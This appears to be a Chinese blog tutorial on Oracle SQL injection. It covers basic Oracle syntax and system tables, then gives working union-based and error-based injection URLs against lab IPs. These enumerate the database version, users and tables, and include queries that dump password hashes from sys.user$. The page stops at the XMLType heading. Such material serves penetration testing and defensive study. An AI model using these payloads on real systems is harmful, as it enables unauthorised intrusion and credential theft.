<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="网络安全,攻防研究" />
  <meta name="author" content="B Stark" />
  <meta name="description" content="" />
  
  
  <title>
    
     B.Stark&#39;Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">


  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>

<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="B.Stark'Blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">BStark</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
MathJax = {
  tex: {
    inlineMath: [['$', '$'], ['\\(', '\\)']]
  }
};
</script>



  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title"></div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2022-01-23 22:22:33
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags" title="标签"></i>
                
                <span class="span--tag">
                  <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
                    <b>#</b> sql注入
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h3 id="Oracle的基础操作"><a href="#Oracle的基础操作" class="headerlink" title="Oracle的基础操作"></a>Oracle的基础操作</h3><p><strong>基础语句</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ø 创建表：</span><br><span class="line">• 语句： <span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名称 类型 约束) • 举例： <span class="keyword">create</span> <span class="keyword">table</span> ichunqiu（name <span class="type">char</span>(<span class="number">10</span>) <span class="keyword">primary</span> key,age tinyint）</span><br><span class="line">Ø 增加列：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span>(字段名称，数据类型) • 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu <span class="keyword">add</span>(class_name varchar2(<span class="number">200</span>))</span><br><span class="line">Ø 删除表中一列：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">set</span> unused <span class="keyword">column</span> 列名</span><br><span class="line">• 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu <span class="keyword">set</span> unused <span class="keyword">column</span> name</span><br><span class="line">Ø 修改表字段：</span><br><span class="line">• 语句：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify( 字段名称 新的字段类型 ) • 举例：<span class="keyword">alter</span> <span class="keyword">table</span> ichunqiu modify(name <span class="type">varchar</span>(<span class="number">200</span>))</span><br></pre></td></tr></table></figure>

<p><strong>权限分类</strong></p>
<p>• DBA：拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构<br>• RESOURCE：拥有Resource权限的用户只可以创建实体，不可以创建数据库结构<br>• CONNECT：拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构<br>• 对于普通用户：授予connect, resource权限<br>• 对于DBA管理用户：授予connect，resource, dba权限<br>• 所有用户都是public组</p>
<p><strong>权限控制</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">to</span> userA; <span class="comment">--赋权给用户：userA</span></span><br><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">to</span> public; <span class="comment">--赋权给所有用户</span></span><br><span class="line">• <span class="keyword">grant</span> <span class="keyword">select</span>, update <span class="keyword">on</span> product <span class="keyword">to</span> userA <span class="keyword">with</span> <span class="keyword">grant</span> option;<span class="comment">-- userA得到权限，并可以传递</span></span><br><span class="line">• <span class="keyword">revoke</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">from</span> userA; <span class="comment">--收回给予的权限从用户</span></span><br><span class="line">• userA <span class="keyword">revoke</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,update <span class="keyword">on</span> tablename <span class="keyword">from</span> public; <span class="comment">--收回给予的权限从所有用户</span></span><br></pre></td></tr></table></figure>

<h3 id="Oracle的系统表"><a href="#Oracle的系统表" class="headerlink" title="Oracle的系统表"></a>Oracle的系统表</h3><ul>
<li><strong>dba_tables</strong> : 系统里所有的表的信息，需要DBA权限才能查询</li>
<li><strong>all_tables : 当前用户有权限的表的信息</strong></li>
<li><strong>user_tables</strong>: 当前用户名下的表的信息</li>
<li><strong>all_tab_columns: 当前用户名下的所有字段名</strong></li>
<li><strong>DBA_ALL_TABLES</strong>：DBA 用户所拥有的或有访问权限的对象和表</li>
<li><strong>ALL_ALL_TABLES</strong>：某一用户拥有的或有访问权限的对象和表</li>
<li><strong>USER_ALL_TABLES</strong>：某一用户所拥有的对象和表</li>
</ul>
<p><code>user_tables</code> 的范围最小，<code>all_tables</code> 看到的东西稍多一些，而 <code>dba_tables</code> 的信息最全</p>
<p><strong>DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</strong></p>
<p><strong>concat 只能拼字符串, ||拼列 查询</strong></p>
<p><strong>强类型转换的时候 数字型  可以使用ascii(substring(banner,1,2)) 转为数字型查询</strong></p>
<p><strong>跨库查询和mysql一样: SELECT * FROM TEST.ADMIN</strong></p>
<h3 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h3><p><strong>1.获取数据库版本：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">WHERE</span> rownum<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> version <span class="keyword">FROM</span> v$instance <span class="keyword">WHERE</span> rownum<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">具体注入的语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>oracle?id<span class="operator">=</span><span class="number">99</span><span class="string">&#x27; union select 1,&#x27;</span>a<span class="string">&#x27;,(SELECT banner FROM v$version WHERE banner LIKE &#x27;</span>Oracle<span class="operator">%</span><span class="number">25</span><span class="string">&#x27;) from dual -- +</span></span><br></pre></td></tr></table></figure>

<p><strong>2.获取操作系统版本：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">where</span> banner <span class="keyword">like</span> <span class="string">&#x27;TNS%&#x27;</span>;</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>oracle?id<span class="operator">=</span><span class="number">99</span><span class="string">&#x27; union select 1,&#x27;</span>a<span class="string">&#x27;,(SELECT banner FROM v$version where banner like &#x27;</span>TNS<span class="operator">%</span><span class="number">25</span><span class="string">&#x27;) from dual -- +</span></span><br></pre></td></tr></table></figure>

<p><strong>3.获取当前用户权限的所有数据库：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner,table_name <span class="keyword">FROM</span> all_tables;</span><br></pre></td></tr></table></figure>

<p><strong>4.获取当前数据库：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> global_name <span class="keyword">FROM</span> global_name;</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> v$database;</span><br><span class="line"><span class="keyword">SELECT</span> instance_name <span class="keyword">FROM</span> v$instance;</span><br><span class="line"><span class="keyword">SELECT</span> SYS.DATABASE_NAME <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure>

<p><strong>5.获取用户相关信息：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual;获取当前数据库用户</span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username;列出所有用户</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sys.user$; — priv;列出所有用户</span><br><span class="line"></span><br><span class="line">列出密码哈希:</span><br><span class="line"><span class="keyword">SELECT</span> name, password, astatus <span class="keyword">FROM</span> sys.user$ — priv; <span class="operator">&lt;=</span> <span class="number">10</span>g(astatus能够在acct被锁定的状态下给你反馈)</span><br><span class="line"><span class="keyword">SELECT</span> name,spare4 <span class="keyword">FROM</span> sys.user$ — priv; <span class="number">11</span>g</span><br><span class="line"></span><br><span class="line">获取数据库所有用户:</span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username;</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> session_privs; 获取当前用户权限</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> dba_sys_privs <span class="comment">-- priv;  获取所有用户权限</span></span><br><span class="line"></span><br><span class="line">获取用户角色</span><br><span class="line"><span class="keyword">SELECT</span> GRANTEE, GRANTED_ROLE <span class="keyword">FROM</span> DBA_ROLE_PRIVS;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> grantee <span class="keyword">FROM</span> dba_sys_privs;</span><br><span class="line"></span><br><span class="line">获取所有数据库用户密码</span><br><span class="line"><span class="keyword">SELECT</span> name, password, astatus <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv, &lt;= 10g;</span></span><br><span class="line"><span class="keyword">SELECT</span> name, spare4 <span class="keyword">FROM</span> sys.user$; <span class="comment">-- priv, &gt;= 11g; </span></span><br><span class="line"></span><br><span class="line">列出DBA账户: #<span class="keyword">DISTINCT</span> 去重复函数</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> grantee <span class="keyword">FROM</span> dba_sys_privs <span class="keyword">WHERE</span> ADMIN_OPTION <span class="operator">=</span> ‘YES’; — priv;</span><br><span class="line"></span><br><span class="line">获取主机名和IP</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name <span class="keyword">FROM</span> dual;</span><br><span class="line"><span class="keyword">SELECT</span> host_name <span class="keyword">FROM</span> v$instance;</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_address <span class="keyword">FROM</span> dual;  查IP</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name(‘<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>’) <span class="keyword">FROM</span> dual;  查主机名称</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> V$DATAFILE;  获取DB文件路径</span><br></pre></td></tr></table></figure>

<p><strong>6.获取字段名和表名:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables; 获取表名</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns; 获取字段名</span><br></pre></td></tr></table></figure>

<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><strong>1.判断是否存在注入</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; &quot; and 1=1 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://172.16.12.2:81/orcl.php? id=1 and 1=dbms_pipe.receive_message(&#x27;</span>RDS<span class="string">&#x27;, 5)--  延时</span></span><br></pre></td></tr></table></figure>

<p><strong>注释符</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Oracle 	单行 <span class="comment">-- 		多行/**/</span></span><br><span class="line">Mssql 	单行 <span class="comment">--空格		多行/**/</span></span><br><span class="line">Mysql 	单行 <span class="comment">--+/空格 #	多行/**/</span></span><br></pre></td></tr></table></figure>

<p><strong>2.判断字段数</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><strong>3.联合查询找回显位</strong><br>Oracle 数据库查询需要 from dual (虚表/伪表) 专为查询语句设置的表 union select * from dual–</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--   #null代替所有类型</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>4.查询数据库版本</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>5.查询数据库连接用户</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">-- #test</span></span><br></pre></td></tr></table></figure>

<p><strong>6.当前实例名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> instance_name <span class="keyword">from</span> v$instance),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>7.遍历数据库名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;SYS&#x27;</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;OUTLN&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>)),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>8.遍历表名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> sys.all_tables <span class="keyword">WHERE</span> OWNER <span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> sys.all_tables <span class="keyword">WHERE</span> OWNER <span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> ROWNUM <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> OWNER <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;tb_user&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>) </span><br></pre></td></tr></table></figure>

<p><strong>9.遍历表字段名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;FLAG&#x27;</span> <span class="keyword">AND</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>)),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>10.查询字段数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> NAME<span class="operator">||</span>AGE <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> &quot;name&quot;<span class="operator">||</span>&quot;age&quot; <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="string">&#x27;username:&#x27;</span><span class="operator">||</span>NAME<span class="operator">||</span><span class="string">&#x27;age:&#x27;</span><span class="operator">||</span>AGE <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul>
<li><strong>utl_inaddr.get_host_name</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在<span class="number">11</span>g之前不需要任何权限，在<span class="number">11</span>g之后当前的数据库用户必须有网络访问权限</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> utl_inaddr.get_host_name( PAYLOAD位置 ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>ctxsys.drithsx.sn</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">处理文本的函数，传入参数错误的时会报错返回异常</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ctxsys.drithsx.sn(<span class="number">1</span>,(    PAYLOAD位置  ))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>CTXSYS.CTX_REPORT.TOKEN_TYPE</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用于处理文本，也会出现参数错误返回异常</span><br><span class="line"><span class="keyword">select</span> CTXSYS.CTX_REPORT.TOKEN_TYPE((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual), <span class="string">&#x27;123&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>XMLType</strong></li>
</ul>
